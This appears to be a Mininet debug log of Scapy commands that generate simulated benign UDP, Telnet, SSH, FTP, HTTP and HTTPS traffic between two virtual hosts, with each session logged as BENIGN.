+2025-07-13 20:56:36,111 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;udp_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/UDP(sport=55084, dport=12346)/Raw(load=bytes.fromhex(\'4d40b8217d11af81c70dba035026d947516ef10ac6bd5a47a944d88faa5e17120606fe737eac3d109b0c44923c5bc02d0f6c08cea6d0ebc9a6268426b72aaefd307003aefa8e132768355843d7053877fc7f7a6fd2e44e4bdba8eb910c225d575975ef7a892660ea6c8ff7f668e4c22bd3b5679451b45836f4c0c790e3edd835019ddff449bfd345acadb037a3f17d905fd61d2932a4acfb0402bac3dcc6672dd581b42171a647bf347782312ef28b66dd9a3bd83df6824709bce2a13a4ee18d2bddfc226bd67a4a9e5b78ed4c3089a21aac5bc26ffbecf659e882e67690ba5f30846eec8332ed095f1056115bc496bab504312ae9ea93eff32c2ef576e26311256e78e35b3b417fca4c6fc64bd4ea48f58cd6bb391708119380ba7bdfc5a6a596e3648f2dc63beafc6f8ba420e6a867048e4f12c1d662cc812cc29d45786c5276f8aabab7fb5e893c8eeacc112a20b1d1154326ed92d7dc11e33587c32d372bd7326a8069d2941d3b1ba8bdd1a95dd0dea8f93eeffa456d6fed7a63e6158a7f7bab1b304d0fb597e5e758edaacef856cb867e77b746be46cd3d0ded2f3cc64d6b7b84845f33abdd98858c2448808c55eff3dc70ef57d5466eb03faa53cb5d3ffb293dec2d76123a38b58a0de2fce9f184a17c9205b144a1436c4d5996c325bdbfa0158540a9538f756da733a184cc9919cc4950f92da50d85e88b7b8ddf7fb73f5c2c0387ebab4a22ca6427a90d7f54140f936ebfa4e7a48dfe4a1829ea88a959363c1153bad5af4bcbf4a1dfc02b777fddecc9642cc0410857d71a7043a3998d85ebdcc597d65f87f2d13998bf8146f89790471bb275c7178b4cb7299847a23d2061ab27b8000c61a954372d06fca70063187cc254adfe7d03d54dcdd11d29eed643118c1c0f525c9966e94a2e61d7ade14c3b2fa2b4a989d0cacf70b507ec1ef7679a291f0d399891e7f6859a096b29c6a4338dee1e7e8422e039c36ec9088746dad33aee5b974910e3f50971ef46b6b84d86cdc12b9a3f98ef4d825f0736deaa375bb586ff3fbc0a5bfeadf63cb7318605bc9ca83470efe6feee6abbb326f782992406dd46e87894eabd5dccb7ef910cdd9f3e1f524f59a25c6dec40644722147678d3a591ddf3c43b09610254266a0060d352edd8e0223bad49ad247645f65e03ce16f02b2bfad2447a0de992b3da7f716ce77b42e8e2ff20dcf3e687db932e345e34a406a91462ede92da7ce086060715d3910dd3c8efa6266de4f6dffeea5397e2cf8a2a9ad7b38fccf52b22a9be93245b20e8f85c80b84ddabe7c0d21bde9f086154738e85b2f232a501d5e6abd060f201967526912b6e7abbbe6ce4d1e632e9edf53b8cce38220839c7223318567fa1e33e102ffb270519a354e0d2fa292c29afafcf0b336c51a3e1d67d1ef19cc97c5588a5242be7d24614cfb3baf6b75b1e0954c1931bbbfe0f455763f155a8d2c28274ea766b53d9d6a35a87423580b763c0d4e80b8b0847759476e292293c9c989d2c7a364a439e9b582ad9cf060bb3004ea48c80ce3bcdc705fa27929d19f7e4d179f4f57df615d8db9f5a9f29bf8e8aa8cef5822482129cad88091ac00448ee7f1c3b4cc973801a5f8ca0f94f59e8b1598c819ae75f9f1679a7c102413c5248b08114fd68827b5f6de611209cbabd02379f67d58bf736a767518fcfad91bf50770651b2265e8e98133e092a166a6310c11a6f9cec1db70d23026a55f04dcad4aa4c5ceac7674a8d6e485ebe2e63357ee06291c11682024dcbcdcc44d8f82ea583b434ec97f51869d816e5a2c25d820c625e2d85b4874cfc3deba793\')); sendp(udp_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:36,172 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:36,686 - mininet - DEBUG - 
+2025-07-13 20:56:36,686 - BENIGN - DEBUG - Generated UDP traffic from h3:55084 -> h5:12346 [content='4d40b8217d11af81c70dba035026d947516ef10a...'] [Session 18] [len=1338B]
+2025-07-13 20:56:36,687 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=4802, dport=23, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:36,748 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:37,319 - mininet - DEBUG - 
+2025-07-13 20:56:37,319 - BENIGN - DEBUG - Generated Telnet SYN from h3:4802 -> h5:23 [len=54B]
+2025-07-13 20:56:37,332 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=23, dport=4802, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:37,394 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:37,935 - mininet - DEBUG - 
+2025-07-13 20:56:37,936 - BENIGN - DEBUG - Generated Telnet SYN-ACK from h5:23 <- h3:4802 [len=54B]
+2025-07-13 20:56:37,947 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=4802, dport=23, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:38,009 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:38,558 - mininet - DEBUG - 
+2025-07-13 20:56:38,558 - BENIGN - DEBUG - Generated Telnet ACK from h3:4802 -> h5:23 [len=54B]
+2025-07-13 20:56:38,570 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;telnet_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=4802, dport=23, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'1f5ea529ba8c11b8be65eb035d7ef4feebf2f517650065309b41cff18eb5327361493ba9713c4ab964449cd6053929d0e4756946ea079d43f937412441de3e83ecda92d2a614cded067d125586d83e9f003cb901019d1e2a65a3965548197618a686ff4974cd412580f02719146dda87a6b13c9b5b2703e91b\')); sendp(telnet_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:38,631 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+2025-07-13 20:56:38,631 - mininet - DEBUG - 
+  import cryptography
+
+2025-07-13 20:56:39,172 - mininet - DEBUG - 
+2025-07-13 20:56:39,172 - BENIGN - DEBUG - Generated Telnet data traffic from h3:4802 -> h5:23 [content='Telnet command'] [Session 19] [len=175B]
+2025-07-13 20:56:39,172 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=23, dport=4802, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:39,233 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:39,785 - mininet - DEBUG - 
+2025-07-13 20:56:39,785 - BENIGN - DEBUG - Generated Telnet ACK reply from h5:23 <- h3:4802 [len=54B]
+2025-07-13 20:56:39,785 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=16468, dport=22, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:39,846 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:40,398 - mininet - DEBUG - 
+2025-07-13 20:56:40,398 - BENIGN - DEBUG - Generated SSH SYN from h3:16468 -> h5:22 [len=54B]
+2025-07-13 20:56:40,413 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=22, dport=16468, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:40,474 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:41,040 - mininet - DEBUG - 
+2025-07-13 20:56:41,040 - BENIGN - DEBUG - Generated SSH SYN-ACK from h5:22 <- h3:16468 [len=54B]
+2025-07-13 20:56:41,050 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=16468, dport=22, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:41,111 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:41,665 - mininet - DEBUG - 
+2025-07-13 20:56:41,665 - BENIGN - DEBUG - Generated SSH ACK from h3:16468 -> h5:22 [len=54B]
+2025-07-13 20:56:41,679 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ssh_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=16468, dport=22, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'f6008e3b6082725c87ee911f51652c8e75493a0d0fcdb8369ac82797b744a020850c9514f5ff0f38cb6e2d96f012ef9bb740fea0ea86b28b98bfd24fbcc729badb6abfb3b179132675aab96071783a1258755c339b0050958328c36a5ccb7eb5fb6d6ff62505f2ef94dc8ab967\')); sendp(ssh_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:41,740 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:42,285 - mininet - DEBUG - 
+2025-07-13 20:56:42,285 - BENIGN - DEBUG - Generated SSH data traffic from h3:16468 -> h5:22 [content='SSH encrypted data'] [Session 20] [len=163B]
+2025-07-13 20:56:42,285 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=22, dport=16468, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:42,346 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:42,914 - mininet - DEBUG - 
+2025-07-13 20:56:42,914 - BENIGN - DEBUG - Generated SSH ACK reply from h5:22 <- h3:16468 [len=54B]
+2025-07-13 20:56:42,914 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=18246, dport=21, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:42,975 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:43,537 - mininet - DEBUG - 
+2025-07-13 20:56:43,537 - BENIGN - DEBUG - Generated FTP SYN from h3:18246 -> h5:21 [len=54B]
+2025-07-13 20:56:43,548 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=21, dport=18246, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:43,609 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:44,187 - mininet - DEBUG - 
+2025-07-13 20:56:44,187 - BENIGN - DEBUG - Generated FTP SYN-ACK from h5:21 <- h3:18246 [len=54B]
+2025-07-13 20:56:44,201 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=18246, dport=21, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:44,262 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:44,824 - mininet - DEBUG - 
+2025-07-13 20:56:44,824 - BENIGN - DEBUG - Generated FTP ACK from h3:18246 -> h5:21 [len=54B]
+2025-07-13 20:56:44,839 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ftp_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=18246, dport=21, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'483ca9f457c118be3a9b3c3c2e053d772f553fd114b8cb9304607383bcb1ff364dae90f44a1f5685424ab67b8c65086745de8a7118f100db2a39c20162347edae05378953c31c840cd49d9002418f818d710fa6baaa6ee191167b6e8060c8c7f089017e415afb3826c4cd802ff8c1dba6a88d10fc2385a5be65ce1903e625a3aea665de587aab510695970e01eb09798672f14fe88f6272a2487445a4a947fc2fe3bed96fa17f27eac9e2077f90eefc5f269f03d1fd605ef1f18a232171f09364f8b31e475df3388a600b45e431e43b9cad753932928aa978baec6d8c1fb56cb3b4b7d09d332cf7e6f31bd02c2312e3c24bb571751ad3bd68a4d39b80a657af57807c4f207353c369366998ae3e86ad05e53cb8dcb50fd8b842b5372c1bbe6701e7dae34245d2a37ea778a9043ff9bd9164cc6424f5b464897f7adc757cd52b9701c3491bc57e00167db80cab65a2c58cd45850ccc3b918075d97152064205f7aea667136b3b1d6a4bc3434118987468ec3bdc83f280ca0388a4c3782e9e72c201e6c5e6b0122390e636cd6497d94932621c8b4d715d4bccac5160019396add2b345a406d115bb05f0c607b868dc107694b5f1de65da954c2896643a5be6b1f7ecdf2dbb82b6baa833a4863bef4529a5c40ff86c29660c9e828331f0edb1b6428dee1bd8629aaff045f5ae560182e4904f5cdb46d4dbcab807685e6c7b04bfbf06f2bddde9f644a762d572bd88e0cd086fe1af704310382b56bfd511ce8b7a1aa98f2697873a994063bb4aad43d66a2c020dd1ad851fcb3e6e7ef2dd695f43ac29b41a03af24474df6db1f9fd0ff0288b71eb9f4e0668b0d120f0acef922a286f0761c7f2a0b181ec40f430e1184ddb1ce30a7fc22932833685afd9318e599f82cfe2e1326f70875b8b6e7eead12e71896264e20e8e7615371a2b8b94598b982d615e1d4fca393da5eb927c0074a91fce389a9d53f844c32364ada9fda459c5f1fc90d1e4f14ef0344ce92a82f3c8d9ae521d82f80fe3e1f6aaaa16c21a799b86748032c51ff051108e4ea8e2f361f69d54ee6b90bb216afc37333daeb43fccd02ca6145ac36279715ec88ea2bc66f27026fbf80cf6fd759071940fe1f60994ac1608f41f31861ee909e5b6f38becf888f445d2eef6ad951b37ef2aa3ce52b6bc6701cbc4df79a22a57d62c48af65528e3bd58a2d04dce751caa10df2a5b9110d4ef3a7c17657927a93549071e04ff881649ba75e8f8d3eadb26578d397a216cd9aa7f242cceff3a9c3143612e814c7e7011dfdfdf006b3c30e40fd0f3b4e996ecdd84102bf668978e1c8c8093795f94fc932f09b99ad710493508e468644b63e31d2cd267f1b91e561e14cdf7c28c9d36ab41b7cdebad6b82200055e92f36a237bfd7296f87a1a52f862b0dc54fb1f73e298f2806f70734369eda65c53b149080fa7da15ef4c4e1cbebc60db415e45ec19399830a4a1845269cde85e6d0fcbf278b5d24f1da8edefd2b80b791c20d4d3cf0d16865510eac94e313f5678057d4addc66dcc9006059009a911449fa3748fa34b3cc063a06d461334186b8cd90c1be30e755263b559644b59e485eb6b4f5310b6c4aa6787dae9f9af91ece2f91cc2c6bf6472272f08e2f59e8b1ed663859eb458a8aed593bd81d7ac80a4d2393ce3ae2ecec42fdc62e1941d80c28119b75bf050ba1\')); sendp(ftp_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:44,900 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:45,448 - mininet - DEBUG - 
+2025-07-13 20:56:45,448 - BENIGN - DEBUG - Generated FTP data traffic from h3:18246 -> h5:21 [content='FTP file transfer'] [Session 21] [len=1258B]
+2025-07-13 20:56:45,449 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=21, dport=18246, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:45,509 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:46,072 - mininet - DEBUG - 
+2025-07-13 20:56:46,072 - BENIGN - DEBUG - Generated FTP ACK reply from h5:21 <- h3:18246 [len=54B]
+2025-07-13 20:56:46,072 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=7625, dport=80, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:46,133 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:46,694 - mininet - DEBUG - 
+2025-07-13 20:56:46,694 - BENIGN - DEBUG - Generated HTTP SYN from h3:7625 -> h5:80 [len=54B]
+2025-07-13 20:56:46,708 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=80, dport=7625, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:46,769 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:47,317 - mininet - DEBUG - 
+2025-07-13 20:56:47,317 - BENIGN - DEBUG - Generated HTTP SYN-ACK from h5:80 <- h3:7625 [len=54B]
+2025-07-13 20:56:47,332 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=7625, dport=80, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:47,393 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:47,938 - mininet - DEBUG - 
+2025-07-13 20:56:47,938 - BENIGN - DEBUG - Generated HTTP ACK from h3:7625 -> h5:80 [len=54B]
+2025-07-13 20:56:47,951 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;http_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=7625, dport=80, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'474554202f696e6465782e68746d6c20485454502f312e310d0a486f73743a2031302e302e302e350d0a557365722d4167656e743a20536361707942656e69676e547261666669630d0a436f6e74656e742d4c656e6774683a203434360d0a0d0a86cfac755fa262e91228ee8e2d69080092acbe67b19770a55d92ffbd5e476d608b7cc456bc0e4b3476d1bf42172ac8e57d534c291a3c7d56d956a8c1906f610b5f649bfc8be97e0e65b21161fe115ff53d2001645249ff9c2a4a1e5be946d98808a7c9613a7d1ad5bdab3405cac551eeb8b85de5d5047db32699aab6d4dc9f07231e143fa6f9085783869c849ed9147a56468a80c37993c16b87b410fb13dd87a882d4b42958f20938bacc87159fbbe1fbc2d7660ba210acf65ad2f90072b249ab010ea15f999d1005c86be8a7b5f073c26a923e34ca556fcb349a9f0c9ba6f5811a19eb311a4914d1c0b80f135a5bb36186c4656b0a578c79f4439c2582cb3667b2252c32b366d67c25d02b20121d403fa97e0abc6343f7edba9f704bf51e8ca7628875cc2438c311a4e34a7a63037e627d31f42dbd88c6bb1265ed54ce6f54a9dc31189a781ce5c082157e14c536ad70a5c37588bcfff3eb628b46e93d530f0a32f0791482b9ab0f3a8311c5486ebaae03f5184a534fd26e5f92fa45ba515a0b840e98a412562cb9e1088bbcad1eeceb220471147c65c1740f9cec5465568cdadbb77be3ca10a05e63c243cac65320d2a76ba938de2ff787e61fe92008\')); sendp(http_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:48,012 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:48,569 - mininet - DEBUG - 
+2025-07-13 20:56:48,569 - BENIGN - DEBUG - Generated HTTP data traffic from h3:7625 -> h5:80 [content='GET /index.html HTTP/1.1'] [Session 22] [len=597B]
+2025-07-13 20:56:48,569 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=80, dport=80, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:48,631 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:49,161 - mininet - DEBUG - 
+2025-07-13 20:56:49,161 - BENIGN - DEBUG - Generated HTTP ACK reply from h5:80 <- h3:7625 [len=54B]
+2025-07-13 20:56:49,161 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=36286, dport=443, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:49,222 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:49,781 - mininet - DEBUG - 
+2025-07-13 20:56:49,781 - BENIGN - DEBUG - Generated HTTPS SYN from h3:36286 -> h5:443 [len=54B]
+2025-07-13 20:56:49,795 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=443, dport=443, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:49,856 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:50,422 - mininet - DEBUG - 
+2025-07-13 20:56:50,423 - BENIGN - DEBUG - Generated HTTPS SYN-ACK from h5:443 <- h3:36286 [len=54B]
+2025-07-13 20:56:50,434 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=36286, dport=443, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:50,495 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:51,047 - mininet - DEBUG - 
+2025-07-13 20:56:51,048 - BENIGN - DEBUG - Generated HTTPS ACK from h3:36286 -> h5:443 [len=54B]
